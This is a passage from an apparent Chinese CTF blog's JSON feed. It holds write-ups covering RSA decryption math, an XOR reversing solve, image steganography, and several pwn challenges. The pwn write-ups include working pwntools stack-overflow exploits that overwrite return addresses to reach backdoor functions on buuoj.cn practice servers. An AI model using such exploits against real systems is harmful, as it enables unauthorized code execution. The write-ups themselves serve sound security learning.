data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ext_euclid<span class=\"token punctuation\">(</span><span class=\"token number\">17</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">2135733082216268400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>由于 d<em>e≡1mod [(p-1)(q-1) 可等价为 d</em>e mod (p-1)(q-1)=1<br />\n 代入 e、p、q<br />\n 所以我们可以把上式看作: 17x+(473398607161-1)(4511491-1) y=1</p>\n<p>代入 φ(n) = (p-1)(q-1),φ(n) 与 e 互质，k 为正整数<br />\n可化为：d= (k*φ(n)+1)/e</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>公钥    n -->  两素数p、q之积</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        e -->  1&lt;e<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>(p-1)·(q-1)且e与乘积互质</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token attr-name\">私钥</span>    <span class=\"token attr-name\">d</span> <span class=\"token attr-name\">--</span><span class=\"token punctuation\">></span></span>  d·e ≡ 1 mod[(p-1)·(q-1)]</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        n -->  同公钥n</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>加密    ----->  C ≡ M^e mod(n)   M为明文</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>解密    ----->  M ≡ C^d mod(n)   C为密文</pre></td></tr></table></figure><h2 id=\"由pqdpdqc求明文的算法\"><a class=\"anchor\" href=\"#由pqdpdqc求明文的算法\">#</a> 由 p,q,dp,dq,c 求明文的算法</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>I <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mp <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>dp<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>mq <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>dq<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span>               <span class=\"token comment\">#求幂取模运算</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>mp<span class=\"token operator\">-</span>mq<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>I<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>p<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>q<span class=\"token operator\">+</span>mq       <span class=\"token comment\">#求明文公式</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>          <span class=\"token comment\">#转为十六进制</span></pre></td></tr></table></figure><p><mark>pow (a,b,c) 表示 a<sup>b</sup> % c 即 a<sup>b</sup> mod c</mark></p>\n<h3 id=\"数学运算规律\"><a class=\"anchor\" href=\"#数学运算规律\">#</a> 数学运算规律</h3>\n<p>a<sup>b</sup> %p = ((a%p)<sup>b</sup>)%p<br />\n 若 a≡b (% p), 则对任意的 c, 都有 (a+c)≡(b+c)(% p)<br />\n 若 a≡b (% p), 则对任意的 c, 都有 (a<em>c)≡(b</em>c)(%p)<br />\n 若 a≡b (% p), 对任意的 c, 都有 c≡d (% p), 那么 (a+c)≡(b+d)(% p),(a<em>c)≡(b</em>d)(%p)</p>\n<p>运算推论：参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pa2Vjb2tlL2FydGljbGUvZGV0YWlscy8xMDU5Njc4MDk/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLWJhaWR1anNfdGl0bGUtMiZhbXA7c3BtPTEwMDEuMjEwMS4zMDAxLjQyNDI=\">https://blog.csdn.net/mikecoke/article/details/105967809?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242</span></p>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/02/6477b861b60b9672.png\" alt=\"\" /></p>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/02/2488b83b697b9b94.png\" alt=\"\" /></p>\n",
            "tags": [
                "wiki",
                "密码学",
                "RSA"
            ]
        },
        {
            "id": "http://kyrita.top/XOR/",
            "url": "http://kyrita.top/XOR/",
            "title": "XOR",
            "date_published": "2021-01-28T02:52:10.605Z",
            "content_html": "<p>关于 python xor 的脚本<br />\n<a id=\"more\"></a></p>\n<h2 id=\"ida打开看看\"><a class=\"anchor\" href=\"#ida打开看看\">#</a> IDA 打开看看</h2>\n<p>找到 main 函数，我们看到有异或字符，和 global 比较，相同的话就获得 flag</p>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/01/f878bebf3c3e1066.png\" alt=\"\" /></p>\n<p><span class=\"purple\">第 9 行得知 flag 的长度为 33</span></p>\n<p><span class=\"red\">第 13 行比较 v6 和 global 处存放的前 31 位字符是否相同；相同则输出 success</span></p>\n<p><span class=\"rainbow\">从 main 函数里面可以得到 V6 的处理方式为 v6 [i] 等于 v6 [i] 原来的值与 v6 [i-1] 按位异或.</span></p>\n<h2 id=\"查看global字符串\"><a class=\"anchor\" href=\"#查看global字符串\">#</a> 查看 global 字符串</h2>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/01/827aed457e7cd92a.png\" alt=\"\" /></p>\n<h2 id=\"编写解密脚本\"><a class=\"anchor\" href=\"#编写解密脚本\">#</a> 编写解密脚本</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token string\">'k'</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">'w&amp;O.@'</span><span class=\"token punctuation\">,</span><span class=\"token number\">17</span><span class=\"token punctuation\">,</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Z;U'</span><span class=\"token punctuation\">,</span><span class=\"token number\">17</span><span class=\"token punctuation\">,</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token string\">'F'</span><span class=\"token punctuation\">,</span><span class=\"token number\">31</span><span class=\"token punctuation\">,</span><span class=\"token string\">'v\"M#D'</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token string\">'g'</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token string\">'h'</span><span class=\"token punctuation\">,</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token string\">'G2O'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ss <span class=\"token operator\">=</span> <span class=\"token string\">'fkw&amp;O.@xZ;UpFv\"M#DghG2O'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token string\">\"f\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">79</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#字符串转换成 10 进制</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tx <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">^</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#对应 v6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>拿到 flag： <span class=\"spoiler bulr\" title=\"快走开(╯▔皿▔)╯\">flag{QianQiuWanDai_YiTongJiangHu}</span></p>\n<h3 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9weXRob24vcHl0aG9uLW9wZXJhdG9ycy5odG1s\">https://www.runoob.com/python/python-operators.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDczMTEwMC9hcnRpY2xlL2RldGFpbHMvODkxNTYxNDE=\">https://blog.csdn.net/weixin_44731100/article/details/89156141</span></p>\n",
            "tags": [
                "wp",
                "Re",
                "逆向异或脚本"
            ]
        },
        {
            "id": "http://kyrita.top/Rip%E8%A6%86%E7%9B%96/",
            "url": "http://kyrita.top/Rip%E8%A6%86%E7%9B%96/",
            "title": "Rip覆盖",
            "date_published": "2021-01-27T11:07:12.924Z",
            "content_html": "<p>实属栈溢出.<br />\n<a id=\"more\"></a><br />\n<img data-src=\"https://i.loli.net/2021/01/27/LsrJ4dpjkzXOnQl.png\" alt=\"\" /></p>\n<h2 id=\"启动ida\"><a class=\"anchor\" href=\"#启动ida\">#</a> 启动 IDA</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/27/6YANSFgolme5ZDB.png\" alt=\"\" /></p>\n<p>这个 gets 没有限制输入，存在栈溢出漏洞.</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/MtCuZR9sfJaQdoV.png\" alt=\"\" /></p>\n<p>需要我们输入来获取 flag;</p>\n<p>在 main 函数下还有一个 fun 函数；我们可以点开看看看</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/TatPnLBF3CpOQsi.png\" alt=\"\" /></p>\n<p>是一个系统调用且 start at 401186 (待会 payload 可以用到)</p>\n<p>双击 s 来到 stack of main 视图，这里了解了我们只需存入 15 个字节即可劫持函数返回地址<br />\n<img data-src=\"https://ftp.bmp.ovh/imgs/2021/01/e6e423001264fe86.png\" alt=\"\" /></p>\n<p>IDA 方面进行的差不多了，下面可以开始着手写脚本了</p>\n<h2 id=\"构造exp\"><a class=\"anchor\" href=\"#构造exp\">#</a> 构造 exp</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>h<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node3.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27829</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">15</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x401186</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>h<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>h<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"执行\"><a class=\"anchor\" href=\"#执行\">#</a> 执行</h2>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/01/3b7387aaa01d232f.png\" alt=\"\" /></p>\n<p>刚开始还不知道要干什么，以为又是脚本写错了，后来才发觉是要执行 cat /flag 命令</p>\n<p><img data-src=\"https://ftp.bmp.ovh/imgs/2021/01/ff3701318adda06f.png\" alt=\"\" /></p>\n<p>get <span class=\"spoiler bulr\" title=\"快走开(╯▔皿▔)╯\">flag{8bf972eb-867d-485b-94d5-737f5bc12947}</span></p>\n",
            "tags": [
                "wp",
                "pwn",
                "栈溢出"
            ]
        },
        {
            "id": "http://kyrita.top/ciscn-2019-n-1/",
            "url": "http://kyrita.top/ciscn-2019-n-1/",
            "title": "ciscn_2019_n_1",
            "date_published": "2021-01-27T09:54:57.711Z",
            "content_html": "<p>可能是栈溢出吗<br />\n<a id=\"more\"></a></p>\n<h2 id=\"先放出pwn的checksec\"><a class=\"anchor\" href=\"#先放出pwn的checksec\">#</a> 先放出 pwn 的 checksec</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/27/nB356Ro1mZPaT7K.png\" alt=\"\" /></p>\n<p>64 位且栈堆不可执行</p>\n<h2 id=\"ida打开\"><a class=\"anchor\" href=\"#ida打开\">#</a> IDA 打开</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/27/M7mdhurN319ifJo.png\" alt=\"\" /></p>\n<p>gets 是可以溢出的，但没必要；这一题我们只要覆盖到 v2, 然后让 v2==11.28125 就可以了.</p>\n<p>因此 gets 时先覆盖 b'a'*(0x30-0x04) 即可到 v2 的部分，再跟上 11.28125 的十六进制数即可成功获取 flag.</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/r457DUpQKStM23l.png\" alt=\"\" /></p>\n<p>通过在线转换我们获得 16 进制的浮点数.</p>\n<p>让我们开始 payload 吧.</p>\n<h2 id=\"构造exp如下\"><a class=\"anchor\" href=\"#构造exp如下\">#</a> 构造 exp 如下</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>h<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28466</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b'A'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41348000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>h<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>h<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>最后执行得到 flag<br />\n<img data-src=\"https://i.loli.net/2021/01/27/biPjdpe4F3ULZ5V.png\" alt=\"\" /></p>\n<p><span class=\"spoiler bulr\" title=\"快走开(╯▔皿▔)╯\">flag{3220e461-4bf7-4910-8abc-19873d83291c}</span></p>\n<h3 id=\"贴一个在线进制转换\"><a class=\"anchor\" href=\"#贴一个在线进制转换\">#</a> 贴一个在线进制转换</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb3N0cGhwLmNvbS9oZXhjb252ZXJ0Lw==\">CLICK ME</span></p>\n",
            "tags": [
                "wp",
                "pwn",
                "栈溢出"
            ]
        },
        {
            "id": "http://kyrita.top/%E8%AF%B7%E9%97%AE%E5%A4%A7%E5%90%89%E6%9D%AF%E7%9A%84%E7%AD%BE%E5%88%B0%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E7%AD%BE%E5%90%97/",
            "url": "http://kyrita.top/%E8%AF%B7%E9%97%AE%E5%A4%A7%E5%90%89%E6%9D%AF%E7%9A%84%E7%AD%BE%E5%88%B0%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E7%AD%BE%E5%90%97/",
            "title": "请问大吉杯的签到是在这里签吗?",
            "date_published": "2021-01-27T02:16:08.102Z",
            "content_html": "<p>之前没接触过 zlib 文件格式；一直在思考如何将文件中的 zlib 解压，这一题整整忙了我两天.<br />\n 我是傻逼.<br />\n<a id=\"more\"></a></p>\n<h2 id=\"notepad查看\"><a class=\"anchor\" href=\"#notepad查看\">#</a> Notepad 查看</h2>\n<p>把下载下来的 png 用 Notepad 打开，发现里面还藏着一个 png.</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/VJ3P6ty4LqXoUCe.png\" alt=\"\" /></p>\n<h2 id=\"我们用binwalk分离一下\"><a class=\"anchor\" href=\"#我们用binwalk分离一下\">#</a> 我们用 binwalk 分离一下</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/27/FoZMvwyrtHJ6QUD.png\" alt=\"\" /></p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/tdCzyXp8U5wS4iB.png\" alt=\"\" /></p>\n<p>发现分离文件中有一张 png, 一张在 zip 里的 png，一份空白文档 (我以为有什么妙用，缩放 (并不是) 二维码什么的) 以及一份 zlib 文件；(接下来的几天里我一直在攻略这份 zlib)</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/NIRQDtWlx3kG2gU.png\" alt=\"\" /></p>\n<p>依据在此，我更加确信这是出错在 zlib. 于是在搜索引擎里不断地搜索关于 zlib 解压的方法 (我是傻逼)<br />\n···<br />\n···<br />\n后来，我才知道，有 zlib 说明大概率是 LSB 隐写；</p>\n<p>在此之前，我先把分离出的 4 张 png 都扫了一遍</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/qsa24LPozNOHSYI.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/nSgAQOD2icHZNMT.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/N13dXg7TDVlZiGJ.jpg\" alt=\"\" /></p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/sbgj7Dx4zcPTWde.jpg\" alt=\"\" /></p>\n<p>可以清楚地知道，第二张图已经明确告诉我们扫到第二张就行了，error 就在 png2;</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/Z2lDuG6rELa35pF.png\" alt=\"\" /></p>\n<h2 id=\"放入stegsolve-记住此刻原图的形状我觉得倒像是一只兔子\"><a class=\"anchor\" href=\"#放入stegsolve-记住此刻原图的形状我觉得倒像是一只兔子\">#</a> 放入 stegsolve (记住此刻原图的形状，我觉得倒像是一只兔子)</h2>\n<p>然后我们查看最低位通道图</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/6kRHfnOJqivBZPc.png\" alt=\"\" /></p>\n<p>是的，没看错，二维码变了；但是还不可以扫喔.<br />\n 接下来我们需要将原图和这张二维码异或一下.</p>\n<p><img data-src=\"https://i.loli.net/2021/01/27/CADyL2eYNq9gc6n.png\" alt=\"\" /><br />\n不过我还找到另一个简便的出现方式<br />\n<img data-src=\"https://i.loli.net/2021/01/27/xhVcW7QvK415pIR.png\" alt=\"\" /><br />\n不约而同地，两张图都出现了神秘的符号；<br />\n 百度后了解了这是猪圈密码.<br />\n<img data-src=\"https://i.loli.net/2021/01/27/FznuCJQO48jq7Yd.png\" alt=\"\" /></p>\n<p>按照这个解密就好了；</p>\n<p>最后得到 flag: <span class=\"spoiler bulr\" title=\"快走开(╯▔皿▔)╯\">flag{dajiadoaidjb}</span></p>\n<p>还是挺简单的，但是之前没接触过 zlib,stegsolve 用得也不熟练，还得做加把劲骑士呢</p>\n",
            "tags": [
                "wp",
                "misc",
                "图片隐写"
            ]
        },
        {
            "id": "http://kyrita.top/HASH%E7%A0%B4%E8%A7%A3/",
            "url": "http://kyrita.top/HASH%E7%A0%B4%E8%A7%A3/",
            "title": "HASH破解",
            "date_published": "2021-01-26T05:25:40.419Z",
            "content_html": "<p>待写<br />\n<a id=\"more\"></a><br />\n 简单论述 windows hash 破解</p>\n",
            "tags": [
                "wiki",
                "密码学",
                "HASH"
            ]
        },
        {
            "id": "http://kyrita.top/pwn/",
            "url": "http://kyrita.top/pwn/",
            "title": "砰！",
            "date_published": "2021-01-26T04:07:07.903Z",
            "content_html": "<p>放假在家准备接触一下从未挑战过的 pwn<br />\n<a id=\"more\"></a></p>\n<h1 id=\"pwn1_sctf_2016\"><a class=\"anchor\" href=\"#pwn1_sctf_2016\">#</a> pwn1_sctf_2016</h1>\n<h2 id=\"download文件后checksec\"><a class=\"anchor\" href=\"#download文件后checksec\">#</a> Download 文件后 checksec</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/26/7j8JaB9lHnkAOEz.png\" alt=\"\" /></p>\n<p>地址在哪已经显而易见了，接着我们 IDA 静态分析一下；</p>\n<h2 id=\"找到漏洞函数\"><a class=\"anchor\" href=\"#找到漏洞函数\">#</a> 找到漏洞函数</h2>\n<p><img data-src=\"https://i.loli.net/2021/01/26/bWcCqv3JaAkjKLM.png\" alt=\"\" /></p>\n<p>s 的长度为 60, 而我们只能够输入 32 个字符，不足以栈溢出；<br />\n 但是 replace 函数会把我们输入的 I 替换成 you,I 是一个字符，you 是三个字符，这样输入 20 个 I 既不会超过 32 字符限制，最终替换成 60 个字符也能够填满 s.</p>\n<h3 id=\"找到后门函数08048f0d\"><a class=\"anchor\" href=\"#找到后门函数08048f0d\">#</a> 找到后门函数：08048F0D</h3>\n<p><img data-src=\"https://i.loli.net/2021/01/26/IFjYROyJEVHSNhx.png\" alt=\"\" /></p>\n<div class=\"note info\">\n<p>exp:</p>\n</div>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">27833</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'I'</span><span class=\"token operator\">*</span><span class=\"token number\">20</span><span class=\"token operator\">+</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x08048F0D</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行结果:</p>\n<p><img data-src=\"https://i.loli.net/2021/01/26/Udh2q8TIw3DECvR.png\" alt=\"\" /></p>\n<p class=\"bulr\">拿到 flag:<br />\n!<span class=\"spoiler\" title=\"快走开(╯▔皿▔)╯\">flag{5e9a24f6-ddb2-4237-b3e0-6d968c34cec8}</span>!</p>\n<h1 id=\"warmup_csaw_2016\"><a class=\"anchor\" href=\"#warmup_csaw_2016\">#</a> warmup_csaw_2016</h1>\n<p>拖入 IDA F5</p>\n<p><img data-src=\"https://i.loli.net/2021/01/26/yY1db59ZflEcagC.png\" alt=\"\" /></p>\n<p>发现要求输入 v5 自变量；</p>\n<p><img data-src=\"https://i.loli.net/2021/01/26/BNTLOps68XFk7Ht.png\" alt=\"\" /></p>\n<p>v5 的可用栈大小为 0x40<br />\n 可以看出，这个 gets 绝对有问题；</p>\n<p>程序存在后门:</p>\n<p><img data-src=\"https://i.loli.net/2021/01/26/OR51iljEJaZWY7p.png\" alt=\"\" /></p>\n<p>sub_40060D 的地址为 0x40060D</p>\n<p>下面我们可以写个脚本跑出 flag;<br />\n 在此之前我们知道 v5 的栈大小为 0x40, 但还需要加上返回值的 8 个字符；<br />\n 最终为 0x48.</p>\n<div class=\"note info\">\n<p>构造 exp</p>\n</div>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28395</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x48</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40060D</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://i.loli.net/2021/01/26/SrE8Q7LZpRatNkH.png\" alt=\"\" /></p>\n<p>得到 flag:</p>\n<p class=\"bulr\"><span class=\"spoiler\" title=\"快走开(╯▔皿▔)╯\">flag{a15dd406-0d79-4f49-b5a0-3dde546a4d3d}</span></p>\n",
            "tags": [
                "wp",
                "pwn",
                "栈溢出"
            ]
        },
        {
            "id": "http://kyrita.top/ctf-show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%921-7/",
            "url": "http://kyrita.top/ctf-show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%921-7/",
            "title": "ctf.show-萌新web1-4",
            "date_published": "2021-01-24T02:48:40.021Z",
